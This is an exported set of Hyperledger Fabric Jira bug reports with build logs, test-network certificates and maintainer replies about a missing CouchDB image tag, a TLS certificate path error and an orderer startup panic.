+ CREATE_OPTS='--tls --cafile cryptogen/ordererOrganizations/orderer.net/tlsca/tlsca.orderer.net-cert.pem'
+ for TXN in $CHANNEL_TXNS
+ peer channel create -o orderer:7050 -c mychannel -f channel.tx --tls --cafile cryptogen/ordererOrganizations/orderer.net/tlsca/tlsca.orderer.net-cert.pem
2019-11-17 19:45:54.368 UTC [viperutil] getKeysRecursively -> DEBU 001 Found map[string]interface{} value for peer.BCCSP
2019-11-17 19:45:54.368 UTC [viperutil] getKeysRecursively -> DEBU 002 Found map[string]interface{} value for peer.BCCSP.SW
2019-11-17 19:45:54.368 UTC [viperutil] unmarshalJSON -> DEBU 003 Unmarshal JSON: value is not a string: 256
2019-11-17 19:45:54.368 UTC [viperutil] getKeysRecursively -> DEBU 004 Found real value for peer.BCCSP.SW.Security setting to int 256
2019-11-17 19:45:54.368 UTC [viperutil] getKeysRecursively -> DEBU 005 Found map[string]interface{} value for peer.BCCSP.SW.FileKeyStore
2019-11-17 19:45:54.368 UTC [viperutil] unmarshalJSON -> DEBU 006 Unmarshal JSON: value cannot be unmarshalled: unexpected end of JSON input
2019-11-17 19:45:54.368 UTC [viperutil] getKeysRecursively -> DEBU 007 Found real value for peer.BCCSP.SW.FileKeyStore.KeyStore setting to string
2019-11-17 19:45:54.368 UTC [viperutil] unmarshalJSON -> DEBU 008 Unmarshal JSON: value cannot be unmarshalled: invalid character 'S' looking for beginning of value
2019-11-17 19:45:54.368 UTC [viperutil] getKeysRecursively -> DEBU 009 Found real value for peer.BCCSP.SW.Hash setting to string SHA2
2019-11-17 19:45:54.368 UTC [viperutil] unmarshalJSON -> DEBU 00a Unmarshal JSON: value cannot be unmarshalled: invalid character 'S' looking for beginning of value
2019-11-17 19:45:54.368 UTC [viperutil] getKeysRecursively -> DEBU 00b Found real value for peer.BCCSP.Default setting to string SW
2019-11-17 19:45:54.368 UTC [viperutil] EnhancedExactUnmarshalKey -> DEBU 00c map[peer.BCCSP:map[Default:SW SW:map[FileKeyStore:map[KeyStore:] Hash:SHA2 Security:256]]]
2019-11-17 19:45:54.368 UTC [bccsp_sw] openKeyStore -> DEBU 00d KeyStore opened at [/etc/hyperledger/fabric/msp/keystore]...done
2019-11-17 19:45:54.368 UTC [bccsp] initBCCSP -> DEBU 00e Initialize BCCSP [SW]
2019-11-17 19:45:54.369 UTC [msp] getPemMaterialFromDir -> DEBU 00f Reading directory /etc/hyperledger/fabric/msp/signcerts
2019-11-17 19:45:54.369 UTC [msp] getPemMaterialFromDir -> DEBU 010 Inspecting file /etc/hyperledger/fabric/msp/signcerts/Admin@org1.net-cert.pem
2019-11-17 19:45:54.369 UTC [msp] getPemMaterialFromDir -> DEBU 011 Reading directory /etc/hyperledger/fabric/msp/cacerts
2019-11-17 19:45:54.369 UTC [msp] getPemMaterialFromDir -> DEBU 012 Inspecting file /etc/hyperledger/fabric/msp/cacerts/ca.org1.net-cert.pem
2019-11-17 19:45:54.369 UTC [msp] getPemMaterialFromDir -> DEBU 013 Reading directory /etc/hyperledger/fabric/msp/admincerts
2019-11-17 19:45:54.369 UTC [msp] getPemMaterialFromDir -> DEBU 014 Inspecting file /etc/hyperledger/fabric/msp/admincerts/Admin@org1.net-cert.pem
2019-11-17 19:45:54.369 UTC [msp] getPemMaterialFromDir -> DEBU 015 Reading directory /etc/hyperledger/fabric/msp/intermediatecerts
2019-11-17 19:45:54.369 UTC [msp] getMspConfig -> DEBU 016 Intermediate certs folder not found at [/etc/hyperledger/fabric/msp/intermediatecerts]. Skipping. [stat /etc/hyperledger/fabric/msp/intermediatecerts: no such file or directory]
2019-11-17 19:45:54.369 UTC [msp] getPemMaterialFromDir -> DEBU 017 Reading directory /etc/hyperledger/fabric/msp/tlscacerts
2019-11-17 19:45:54.369 UTC [msp] getPemMaterialFromDir -> DEBU 018 Inspecting file /etc/hyperledger/fabric/msp/tlscacerts/tlsca.org1.net-cert.pem
2019-11-17 19:45:54.369 UTC [msp] getPemMaterialFromDir -> DEBU 019 Reading directory /etc/hyperledger/fabric/msp/tlsintermediatecerts
2019-11-17 19:45:54.369 UTC [msp] getMspConfig -> DEBU 01a TLS intermediate certs folder not found at [/etc/hyperledger/fabric/msp/tlsintermediatecerts]. Skipping. [stat /etc/hyperledger/fabric/msp/tlsintermediatecerts: no such file or directory]
2019-11-17 19:45:54.369 UTC [msp] getPemMaterialFromDir -> DEBU 01b Reading directory /etc/hyperledger/fabric/msp/crls
2019-11-17 19:45:54.369 UTC [msp] getMspConfig -> DEBU 01c crls folder not found at [/etc/hyperledger/fabric/msp/crls]. Skipping. [stat /etc/hyperledger/fabric/msp/crls: no such file or directory]
2019-11-17 19:45:54.369 UTC [msp] getMspConfig -> DEBU 01d MSP configuration file not found at [/etc/hyperledger/fabric/msp/config.yaml]: [stat /etc/hyperledger/fabric/msp/config.yaml: no such file or directory]
2019-11-17 19:45:54.370 UTC [msp] newBccspMsp -> DEBU 01e Creating BCCSP-based MSP instance
2019-11-17 19:45:54.370 UTC [msp] New -> DEBU 01f Creating Cache-MSP instance
2019-11-17 19:45:54.370 UTC [msp] loadLocaMSP -> DEBU 020 Created new local MSP
2019-11-17 19:45:54.370 UTC [msp] Setup -> DEBU 021 Setting up MSP instance Org1MSP
2019-11-17 19:45:54.371 UTC [msp.identity] newIdentity -> DEBU 022 Creating identity instance for cert -----BEGIN CERTIFICATE-----
MIICMDCCAdegAwIBAgIQAbJ5wkXbLPpHjMNPeglQczAKBggqhkjOPQQDAjBjMQsw
CQYDVQQGEwJVUzETMBEGA1UECBMKQ2FsaWZvcm5pYTEWMBQGA1UEBxMNU2FuIEZy
YW5jaXNjbzERMA8GA1UEChMIb3JnMS5uZXQxFDASBgNVBAMTC2NhLm9yZzEubmV0
MB4XDTE5MTExNzE5NDAwMFoXDTI5MTExNDE5NDAwMFowYzELMAkGA1UEBhMCVVMx
EzARBgNVBAgTCkNhbGlmb3JuaWExFjAUBgNVBAcTDVNhbiBGcmFuY2lzY28xETAP
BgNVBAoTCG9yZzEubmV0MRQwEgYDVQQDEwtjYS5vcmcxLm5ldDBZMBMGByqGSM49
AgEGCCqGSM49AwEHA0IABA7teuuatOT9OzatLqNBWfXaON0fUPr8Xhc+mciOvGil
HMawF491FmaYih5HvTzJJ2I5GWqfiBBOT/tO8RrztnWjbTBrMA4GA1UdDwEB/wQE
AwIBpjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDwYDVR0TAQH/BAUw
AwEB/zApBgNVHQ4EIgQg8it7avD5J0RzdIFafDO17bYDAw2cY36U0607AJCzpDgw
CgYIKoZIzj0EAwIDRwAwRAIgcaFPFbc/AcJAug2LNSH/+bKJcnh0aYTCpsVJtHVP
FL8CIFHwnbjDzFw7ELChxMVDzWRn1KbZj7/H2e8zPtinTJRn
-----END CERTIFICATE-----
2019-11-17 19:45:54.371 UTC [msp.identity] newIdentity -> DEBU 023 Creating identity instance for cert -----BEGIN CERTIFICATE-----
MIICATCCAaigAwIBAgIRAMQA08kR61XRMi8lI2fxPYowCgYIKoZIzj0EAwIwYzEL
MAkGA1UEBhMCVVMxEzARBgNVBAgTCkNhbGlmb3JuaWExFjAUBgNVBAcTDVNhbiBG
cmFuY2lzY28xETAPBgNVBAoTCG9yZzEubmV0MRQwEgYDVQQDEwtjYS5vcmcxLm5l
dDAeFw0xOTExMTcxOTQwMDBaFw0yOTExMTQxOTQwMDBaMFMxCzAJBgNVBAYTAlVT
MRMwEQYDVQQIEwpDYWxpZm9ybmlhMRYwFAYDVQQHEw1TYW4gRnJhbmNpc2NvMRcw
FQYDVQQDDA5BZG1pbkBvcmcxLm5ldDBZMBMGByqGSM49AgEGCCqGSM49AwEHA0IA
BCFfGikgvuSJlIpr40UotAQcwv6fsK7SOJ4XRXw9FSMDG/xrx+SLwVvCnz8TXxMN
HhKzaanvfm6hRr6hQ0qwZOqjTTBLMA4GA1UdDwEB/wQEAwIHgDAMBgNVHRMBAf8E
AjAAMCsGA1UdIwQkMCKAIPIre2rw+SdEc3SBWnwzte22AwMNnGN+lNOtOwCQs6Q4
MAoGCCqGSM49BAMCA0cAMEQCIDvW2drk5Bkk7LjRpoKAulpMzxqcZS8xbEPDV5Vb
JxsfAiACVtAdn5TDnoF+209DL3kLedRPKJUy25d7tg5d7zhG5g==
-----END CERTIFICATE-----
2019-11-17 19:45:54.371 UTC [bccsp_sw] loadPrivateKey -> DEBU 024 Loading private key [dc898fd04c95f546cc94291b352c3a94e8056748af6570fd3d2968e14fa94fc5] at [/etc/hyperledger/fabric/msp/keystore/dc898fd04c95f546cc94291b352c3a94e8056748af6570fd3d2968e14fa94fc5_sk]...
2019-11-17 19:45:54.371 UTC [msp.identity] newIdentity -> DEBU 025 Creating identity instance for cert -----BEGIN CERTIFICATE-----
MIICATCCAaigAwIBAgIRAMQA08kR61XRMi8lI2fxPYowCgYIKoZIzj0EAwIwYzEL
MAkGA1UEBhMCVVMxEzARBgNVBAgTCkNhbGlmb3JuaWExFjAUBgNVBAcTDVNhbiBG
cmFuY2lzY28xETAPBgNVBAoTCG9yZzEubmV0MRQwEgYDVQQDEwtjYS5vcmcxLm5l
dDAeFw0xOTExMTcxOTQwMDBaFw0yOTExMTQxOTQwMDBaMFMxCzAJBgNVBAYTAlVT
MRMwEQYDVQQIEwpDYWxpZm9ybmlhMRYwFAYDVQQHEw1TYW4gRnJhbmNpc2NvMRcw
FQYDVQQDDA5BZG1pbkBvcmcxLm5ldDBZMBMGByqGSM49AgEGCCqGSM49AwEHA0IA
BCFfGikgvuSJlIpr40UotAQcwv6fsK7SOJ4XRXw9FSMDG/xrx+SLwVvCnz8TXxMN
HhKzaanvfm6hRr6hQ0qwZOqjTTBLMA4GA1UdDwEB/wQEAwIHgDAMBgNVHRMBAf8E
AjAAMCsGA1UdIwQkMCKAIPIre2rw+SdEc3SBWnwzte22AwMNnGN+lNOtOwCQs6Q4
MAoGCCqGSM49BAMCA0cAMEQCIDvW2drk5Bkk7LjRpoKAulpMzxqcZS8xbEPDV5Vb
JxsfAiACVtAdn5TDnoF+209DL3kLedRPKJUy25d7tg5d7zhG5g==
-----END CERTIFICATE-----
2019-11-17 19:45:54.372 UTC [msp] setupSigningIdentity -> DEBU 026 Signing identity expires at 2029-11-14 19:40:00 +0000 UTC
2019-11-17 19:45:54.372 UTC [msp.identity] newIdentity -> DEBU 027 Creating identity instance for cert -----BEGIN CERTIFICATE-----
MIICATCCAaigAwIBAgIRAMQA08kR61XRMi8lI2fxPYowCgYIKoZIzj0EAwIwYzEL
MAkGA1UEBhMCVVMxEzARBgNVBAgTCkNhbGlmb3JuaWExFjAUBgNVBAcTDVNhbiBG
cmFuY2lzY28xETAPBgNVBAoTCG9yZzEubmV0MRQwEgYDVQQDEwtjYS5vcmcxLm5l
dDAeFw0xOTExMTcxOTQwMDBaFw0yOTExMTQxOTQwMDBaMFMxCzAJBgNVBAYTAlVT
MRMwEQYDVQQIEwpDYWxpZm9ybmlhMRYwFAYDVQQHEw1TYW4gRnJhbmNpc2NvMRcw
FQYDVQQDDA5BZG1pbkBvcmcxLm5ldDBZMBMGByqGSM49AgEGCCqGSM49AwEHA0IA
BCFfGikgvuSJlIpr40UotAQcwv6fsK7SOJ4XRXw9FSMDG/xrx+SLwVvCnz8TXxMN
HhKzaanvfm6hRr6hQ0qwZOqjTTBLMA4GA1UdDwEB/wQEAwIHgDAMBgNVHRMBAf8E
AjAAMCsGA1UdIwQkMCKAIPIre2rw+SdEc3SBWnwzte22AwMNnGN+lNOtOwCQs6Q4
MAoGCCqGSM49BAMCA0cAMEQCIDvW2drk5Bkk7LjRpoKAulpMzxqcZS8xbEPDV5Vb
JxsfAiACVtAdn5TDnoF+209DL3kLedRPKJUy25d7tg5d7zhG5g==
-----END CERTIFICATE-----
2019-11-17 19:45:54.372 UTC [msp] Validate -> DEBU 028 MSP Org1MSP validating identity
2019-11-17 19:45:54.373 UTC [msp] GetDefaultSigningIdentity -> DEBU 029 Obtaining default signing identity
Error: failed to create deliver client: failed to load config for OrdererClient: unable to load orderer.tls.rootcert.file: open /etc/hyperledger/fabric/cryptogen/ordererOrganizations/orderer.net/tlsca/tlsca.orderer.net-cert.pem: no such file or directory
hlbcadmin@ubuntu:~/go/src/github.com/hyperledger/fabric/examples/cluster$
================
END CONSOLE OUTPUT
================;;;","04/Jan/20 8:27 PM;mastersingh24;We've removed this from master so not going to fix the older versions.
This really should have never been added to the repo ion the first place;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ERROR: manifest for hyperledger/fabric-couchdb:amd64-1.4.4 not found: manifest unknown: manifest unknown,FAB-17100,43359,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Invalid: Not Supported,,pvrbharg,pvrbharg,18/Nov/19 5:00 AM,03/Dec/19 6:19 AM,28/Oct/23 3:09 AM,02/Dec/19 8:50 PM,v1.4.4,,,,,,,,,,,,,,,,,,,,,,0,failure,,,,,ERROR: manifest for hyperledger/fabric-couchdb:amd64-1.4.4 not found: manifest unknown: manifest unknown,,btl5037,denyeart,pvrbharg,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"18/Nov/19 5:03 AM;pvrbharg;2019-11-17_11-37-10.png;https://jira.hyperledger.org/secure/attachment/17941/2019-11-17_11-37-10.png","18/Nov/19 4:59 AM;pvrbharg;2019-11-17_11-37-10.png;https://jira.hyperledger.org/secure/attachment/17940/2019-11-17_11-37-10.png",,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i014ub:",,,,Unset,Unset,,"fabric/examples/cluster - out-of-box for v1.4.4 release/tag
make  compose TLS=true RELEASE=amd64-1.4.4
WORK-AROUND:
docker pull couchdb images as shown below and manually tag the same image as shown below:
hyperledger/fabric-couchdb                                                                            0.4.15              8de128a55539        8 months ago        1.5GB
hyperledger/fabric-couchdb                                                                            amd64-1.4.4         8de128a55539        8 months ago        1.5GB
hyperledger/fabric-couchdb                                                                            latest              8de128a55539        8 months ago        1.5GB

docker tag hyperledger/fabric-couchdb:latest hyperledger/fabric-couchdb:amd64-1.4.4",,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,denyeart,pvrbharg,,,,,,,,,,,,release-2.4,main-emeritius,main,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"18/Nov/19 5:03 AM;pvrbharg;CONSOLE OUTPUT:
=============
hlbcadmin@ubuntu:~/go/src/github.com/hyperledger/fabric/examples/cluster$ make  compose TLS=true RELEASE=amd64-1.4.4
GOBIN=/home/hlbcadmin/go/src/github.com/hyperledger/fabric/examples/cluster/build/bin go install github.com/hyperledger/fabric/common/tools/cryptogen
build/bin/cryptogen generate --config config/cryptogen.yaml --output build/cryptogen
org1.net
cp -R build/cryptogen/peerOrganizations/org1.net/peers/peer1.org1.net/* build/nodes/peer1
cp config/configtx.yaml build/nodes/peer1/configtx.yaml
cp config/core.yaml build/nodes/peer1/core.yaml
Built build/nodes/peer1
cp -R build/cryptogen/peerOrganizations/org1.net/peers/peer2.org1.net/* build/nodes/peer2
cp config/configtx.yaml build/nodes/peer2/configtx.yaml
cp config/core.yaml build/nodes/peer2/core.yaml
Built build/nodes/peer2
cp -R build/cryptogen/peerOrganizations/org1.net/peers/peer3.org1.net/* build/nodes/peer3
cp config/configtx.yaml build/nodes/peer3/configtx.yaml
cp config/core.yaml build/nodes/peer3/core.yaml
Built build/nodes/peer3
cp -R build/cryptogen/peerOrganizations/org1.net/peers/peer4.org1.net/* build/nodes/peer4
cp config/configtx.yaml build/nodes/peer4/configtx.yaml
cp config/core.yaml build/nodes/peer4/core.yaml
Built build/nodes/peer4
cp config/orderer.yaml build/nodes/orderer/orderer.yaml
cp config/configtx.yaml build/configtx.yaml
cp config/core.yaml build/core.yaml
GOBIN=/home/hlbcadmin/go/src/github.com/hyperledger/fabric/examples/cluster/build/bin go install github.com/hyperledger/fabric/common/tools/configtxgen
FABRIC_CFG_PATH=build build/bin/configtxgen -profile SampleOrg -outputBlock build/nodes/orderer/genesis.block
2019-11-17 19:21:40.806 UTC [common.tools.configtxgen] main -> WARN 001 Omitting the channel ID for configtxgen for output operations is deprecated.  Explicitly passing the channel ID will be required in the future, defaulting to 'testchainid'.
2019-11-17 19:21:40.806 UTC [common.tools.configtxgen] main -> INFO 002 Loading configuration
2019-11-17 19:21:40.809 UTC [common.tools.configtxgen.localconfig] completeInitialization -> INFO 003 orderer type: solo
2019-11-17 19:21:40.809 UTC [common.tools.configtxgen.localconfig] Load -> INFO 004 Loaded configuration: /home/hlbcadmin/go/src/github.com/hyperledger/fabric/examples/cluster/build/configtx.yaml
2019-11-17 19:21:40.811 UTC [common.tools.configtxgen.localconfig] completeInitialization -> INFO 005 orderer type: solo
2019-11-17 19:21:40.811 UTC [common.tools.configtxgen.localconfig] LoadTopLevel -> INFO 006 Loaded configuration: /home/hlbcadmin/go/src/github.com/hyperledger/fabric/examples/cluster/build/configtx.yaml
2019-11-17 19:21:40.811 UTC [common.tools.configtxgen.encoder] NewChannelGroup -> WARN 007 Default policy emission is deprecated, please include policy specifications for the channel group in configtx.yaml
2019-11-17 19:21:40.811 UTC [common.tools.configtxgen.encoder] NewOrdererGroup -> WARN 008 Default policy emission is deprecated, please include policy specifications for the orderer group in configtx.yaml
2019-11-17 19:21:40.812 UTC [common.tools.configtxgen.encoder] NewOrdererOrgGroup -> WARN 009 Default policy emission is deprecated, please include policy specifications for the orderer org group OrdererOrg in configtx.yaml
2019-11-17 19:21:40.812 UTC [common.tools.configtxgen.encoder] NewConsortiumOrgGroup -> WARN 00a Default policy emission is deprecated, please include policy specifications for the orderer org group OrdererOrg in configtx.yaml
2019-11-17 19:21:40.812 UTC [common.tools.configtxgen.encoder] NewConsortiumOrgGroup -> WARN 00b Default policy emission is deprecated, please include policy specifications for the orderer org group Org1MSP in configtx.yaml
2019-11-17 19:21:40.812 UTC [common.tools.configtxgen] doOutputBlock -> INFO 00c Generating genesis block
2019-11-17 19:21:40.813 UTC [common.tools.configtxgen] doOutputBlock -> INFO 00d Writing genesis block
cp -R build/cryptogen/ordererOrganizations/orderer.net/orderers/orderer.orderer.net/* build/nodes/orderer
cp config/configtx.yaml build/nodes/orderer/configtx.yaml
cp config/core.yaml build/nodes/orderer/core.yaml
Built build/nodes/orderer
FABRIC_CFG_PATH=build build/bin/configtxgen -profile SampleChannel \
        -channelID mychannel \
        -outputCreateChannelTx build/channel.tx
2019-11-17 19:21:40.849 UTC [common.tools.configtxgen] main -> INFO 001 Loading configuration
2019-11-17 19:21:40.851 UTC [common.tools.configtxgen.localconfig] Load -> INFO 002 Loaded configuration: /home/hlbcadmin/go/src/github.com/hyperledger/fabric/examples/cluster/build/configtx.yaml
2019-11-17 19:21:40.853 UTC [common.tools.configtxgen.localconfig] completeInitialization -> INFO 003 orderer type: solo
2019-11-17 19:21:40.853 UTC [common.tools.configtxgen.localconfig] LoadTopLevel -> INFO 004 Loaded configuration: /home/hlbcadmin/go/src/github.com/hyperledger/fabric/examples/cluster/build/configtx.yaml
2019-11-17 19:21:40.853 UTC [common.tools.configtxgen] doOutputChannelCreateTx -> INFO 005 Generating new channel configtx
2019-11-17 19:21:40.853 UTC [common.tools.configtxgen.encoder] NewChannelGroup -> WARN 006 Default policy emission is deprecated, please include policy specifications for the channel group in configtx.yaml
2019-11-17 19:21:40.853 UTC [common.tools.configtxgen.encoder] NewApplicationGroup -> WARN 007 Default policy emission is deprecated, please include policy specifications for the application group in configtx.yaml
2019-11-17 19:21:40.853 UTC [common.tools.configtxgen.encoder] NewApplicationOrgGroup -> WARN 008 Default policy emission is deprecated, please include policy specifications for the application org group Org1MSP in configtx.yaml
2019-11-17 19:21:40.853 UTC [common.tools.configtxgen.encoder] NewChannelGroup -> WARN 009 Default policy emission is deprecated, please include policy specifications for the channel group in configtx.yaml
2019-11-17 19:21:40.853 UTC [common.tools.configtxgen.encoder] NewApplicationGroup -> WARN 00a Default policy emission is deprecated, please include policy specifications for the application group in configtx.yaml
2019-11-17 19:21:40.854 UTC [common.tools.configtxgen.encoder] NewApplicationOrgGroup -> WARN 00b Default policy emission is deprecated, please include policy specifications for the application org group Org1MSP in configtx.yaml
2019-11-17 19:21:40.854 UTC [common.tools.configtxgen] doOutputChannelCreateTx -> INFO 00c Writing new channel tx
FABRIC_CFG_PATH=build build/bin/configtxgen -profile SampleChannel \
        -channelID mychannel \
        -outputAnchorPeersUpdate build/anchor.tx \
        -asOrg Org1MSP
2019-11-17 19:21:40.882 UTC [common.tools.configtxgen] main -> INFO 001 Loading configuration
2019-11-17 19:21:40.884 UTC [common.tools.configtxgen.localconfig] Load -> INFO 002 Loaded configuration: /home/hlbcadmin/go/src/github.com/hyperledger/fabric/examples/cluster/build/configtx.yaml
2019-11-17 19:21:40.885 UTC [common.tools.configtxgen.localconfig] completeInitialization -> INFO 003 orderer type: solo
2019-11-17 19:21:40.885 UTC [common.tools.configtxgen.localconfig] LoadTopLevel -> INFO 004 Loaded configuration: /home/hlbcadmin/go/src/github.com/hyperledger/fabric/examples/cluster/build/configtx.yaml
2019-11-17 19:21:40.885 UTC [common.tools.configtxgen] doOutputAnchorPeersUpdate -> INFO 005 Generating anchor peer update
2019-11-17 19:21:40.886 UTC [common.tools.configtxgen] doOutputAnchorPeersUpdate -> INFO 006 Writing anchor peer update
cp -R build/cryptogen/peerOrganizations/org1.net/users/Admin@org1.net/* build/nodes/cli
cp config/configtx.yaml build/nodes/cli/configtx.yaml
cp config/core.yaml build/nodes/cli/core.yaml
Built build/nodes/cli
cp config/fabric-ca-server-config.yaml build/nodes/ca/fabric-ca-server-config.yaml
cp build/cryptogen/peerOrganizations/org1.net/ca/*_sk build/nodes/ca/ca.key
cp build/cryptogen/peerOrganizations/org1.net/ca/*.pem build/nodes/ca/ca.crt
cp config/fabric-tlsca-server-config.yaml build/nodes/tlsca/fabric-tlsca-server-config.yaml
cp build/cryptogen/peerOrganizations/org1.net/tlsca/*_sk build/nodes/tlsca/ca.key
cp build/cryptogen/peerOrganizations/org1.net/tlsca/*.pem build/nodes/tlsca/ca.crt
mv build/nodes/tlsca/fabric-tlsca-server-config.yaml build/nodes/tlsca/fabric-ca-server-config.yaml
cat compose/docker-compose.yaml.in \
        | sed -e 's/_TLS_ENABLED_/true/g' \
        | sed -e 's/_DOCKER_NS_/hyperledger/g' \
        | sed -e 's/_CA_RELEASE_/amd64-1.4.4/g' \
        | sed -e 's/_COUCH_RELEASE_/amd64-1.4.4/g' \
        | sed -e 's/_FABRIC_RELEASE_/amd64-1.4.4/g' \
        > build/docker-compose.yaml
cat compose/compose-up.sh.in \
        | sed -e 's/_COMPOSE_DAEMONS_/peer1 peer2 peer3 peer4 orderer ca tlsca/g' \
        | sed -e 's/_COMPOSE_CHANNEL_NAME_/mychannel/g' \
        | sed -e 's/_COMPOSE_PEERS_/peer1 peer2 peer3 peer4/g' \
        | sed -e 's/_COMPOSE_NODES_/peer1 peer2 peer3 peer4 orderer cli ca tlsca/g' \
        | sed -e 's/_COMPOSE_TLS_/true/g' \
        > build/compose-up.sh
chmod +x build/compose-up.sh
cp compose/configure.sh.in build/configure.sh
Build complete: run 'build/compose-up.sh'
hlbcadmin@ubuntu:~/go/src/github.com/hyperledger/fabric/examples/cluster$ ./build/compose-up.sh
========================================================================
Launching Hyperledger Cluster via docker-compose
========================================================================
Creating network ""build_default"" with the default driver
Pulling couchdb1 (hyperledger/fabric-couchdb:amd64-1.4.4)...
ERROR: manifest for hyperledger/fabric-couchdb:amd64-1.4.4 not found: manifest unknown: manifest unknown
================
END CONSOLE OUTPUT
================;;;","02/Dec/19 11:52 AM;btl5037;Our ""thirdparty"" images are not versioned according to the fabric spec. Fabric 1.4.4 uses fabric-couchdb:0.4.18.

In Fabric 2.0 we have retired all of our thirdparty images in favor of publicly available CouchDB, Kafka and Zookeeper images, and replaced baseimage with raw alpine implementations.;;;","02/Dec/19 12:12 PM;pvrbharg;If I recall correctly - the out of box script itself fails - if you choose to use couchdb and with TLS enabled. 
I think we would look due diligent if we make this work - out-of-box with TLS enabled and with couchdb being used as statedb.

Thanks. ;;;","02/Dec/19 12:29 PM;btl5037;I see now you are using the examples in the Fabric repo (missed this before). I'm not sure we maintain those anymore, we removed them in the current master branch.

[~denyeart] do we still maintain the examples directory in release-1.4? Has fabric-samples replaced all of this?;;;","02/Dec/19 8:50 PM;denyeart;Yeah, /fabric/examples are no longer maintained, in master everything is moved to fabric-samples repository.
I'll close for now, but if there is an issue in fabric-samples please re-open.;;;","03/Dec/19 6:19 AM;pvrbharg;Dear Brett and David,

My bad - I did not realize that these samples are not being maintained or moved off to samples repo. I did not mean to give us more work.

I am good and I generally use fabric-samples repo contents more often - for most part.

Thanks.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fatal panic on orderer bootup,FAB-17101,43363,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid: Test Error,,Tecnalia,Tecnalia,18/Nov/19 8:35 PM,26/Apr/20 1:32 PM,28/Oct/23 3:09 AM,26/Apr/20 1:32 PM,,,,,,,,,,,,,,fabric-orderer,,,,,,,,,0,,,,,,"{{No idea why im getting this error while deploying the orderer with docker.}}

 

{{My fabric version is 1.4.3 using official tagged image}}

 

{{2019-11-18 11:30:15.752 UTC [orderer.common.server] createLedgerFactory -> DEBU 15d Ledger dir: /var/hyperledger/production/orderer}}
{{2019-11-18 11:30:15.752 UTC [kvledger.util] CreateDirIfMissing -> DEBU 15e CreateDirIfMissing [/var/hyperledger/production/orderer/index/]}}
{{2019-11-18 11:30:15.752 UTC [kvledger.util] logDirStatus -> DEBU 15f Before creating dir - [/var/hyperledger/production/orderer/index/] exists}}
{{2019-11-18 11:30:15.752 UTC [kvledger.util] logDirStatus -> DEBU 160 After creating dir - [/var/hyperledger/production/orderer/index/] exists}}
{{2019-11-18 11:30:15.775 UTC [orderer.common.server] createSubDir -> DEBU 161 Found chains sub-dir and using it}}
{{2019-11-18 11:30:15.775 UTC [orderer.common.server] extractSysChanLastConfig -> INFO 162 Not bootstrapping because of 1 existing channels}}
{{2019-11-18 11:30:15.776 UTC [fsblkstorage] newBlockfileMgr -> DEBU 163 newBlockfileMgr() initializing file-based block storage for ledger: system }}
{{2019-11-18 11:30:15.776 UTC [kvledger.util] CreateDirIfMissing -> DEBU 164 CreateDirIfMissing [/var/hyperledger/production/orderer/chains/system/]}}
{{2019-11-18 11:30:15.776 UTC [kvledger.util] logDirStatus -> DEBU 165 Before creating dir - [/var/hyperledger/production/orderer/chains/system/] does not exist}}
{{2019-11-18 11:30:15.776 UTC [kvledger.util] logDirStatus -> DEBU 166 After creating dir - [/var/hyperledger/production/orderer/chains/system/] exists}}
{{2019-11-18 11:30:15.776 UTC [fsblkstorage] newBlockfileMgr -> INFO 167 Getting block information from block storage}}
{{2019-11-18 11:30:15.776 UTC [fsblkstorage] constructCheckpointInfoFromBlockFiles -> DEBU 168 Retrieving checkpoint info from block files}}
{{2019-11-18 11:30:15.776 UTC [fsblkstorage] retrieveLastFileSuffix -> DEBU 169 retrieveLastFileSuffix()}}
{{2019-11-18 11:30:15.776 UTC [fsblkstorage] retrieveLastFileSuffix -> DEBU 16a retrieveLastFileSuffix() - biggestFileNum = -1}}
{{2019-11-18 11:30:15.776 UTC [fsblkstorage] constructCheckpointInfoFromBlockFiles -> DEBU 16b Last file number found = -1}}
{{2019-11-18 11:30:15.776 UTC [fsblkstorage] constructCheckpointInfoFromBlockFiles -> DEBU 16c No block file found}}
{{2019-11-18 11:30:15.776 UTC [fsblkstorage] newBlockfileMgr -> DEBU 16d Info constructed by scanning the blocks dir = (*fsblkstorage.checkpointInfo)(0xc00026c2a0)(latestFileChunkSuffixNum=[0], latestFileChunksize=[0], isChainEmpty=[true], lastBlockNumber=[0])}}
{{2019-11-18 11:30:15.781 UTC [fsblkstorage] newBlockIndex -> DEBU 16e newBlockIndex() - indexItems:[[BlockNum]]}}
{{panic: runtime error: invalid memory address or nil pointer dereference}}
{{[signal SIGSEGV: segmentation violation code=0x1 addr=0x10 pc=0x9ed5e9]}}{{goroutine 1 [running]:}}
{{github.com/hyperledger/fabric/protos/utils.GetMetadataFromBlock(0x0, 0x1, 0x0, 0x194, 0x1b8f970)}}
{{ /opt/gopath/src/github.com/hyperledger/fabric/protos/utils/blockutils.go:55 +0x39}}
{{github.com/hyperledger/fabric/protos/utils.GetLastConfigIndexFromBlock(0x0, 0xc0002b2400, 0xffffffffffffffff, 0x0)}}
{{ /opt/gopath/src/github.com/hyperledger/fabric/protos/utils/blockutils.go:75 +0x37}}
{{github.com/hyperledger/fabric/orderer/common/multichannel.ConfigBlock(0x7fb1000890f0, 0xc0002b2400, 0xc0002b2400)}}
{{ /opt/gopath/src/github.com/hyperledger/fabric/orderer/common/multichannel/registrar.go:112 +0x68}}
{{github.com/hyperledger/fabric/orderer/common/server.extractSysChanLastConfig(0x114f780, 0xc0002b2060, 0xc00014a300, 0x114f780)}}
{{ /opt/gopath/src/github.com/hyperledger/fabric/orderer/common/server/main.go:207 +0x275}}
{{github.com/hyperledger/fabric/orderer/common/server.Start(0x1018e03, 0x5, 0xc0001ac900)}}
{{ /opt/gopath/src/github.com/hyperledger/fabric/orderer/common/server/main.go:110 +0x28a}}
{{github.com/hyperledger/fabric/orderer/common/server.Main()}}
{{ /opt/gopath/src/github.com/hyperledger/fabric/orderer/common/server/main.go:91 +0x1ce}}
{{main.main()}}
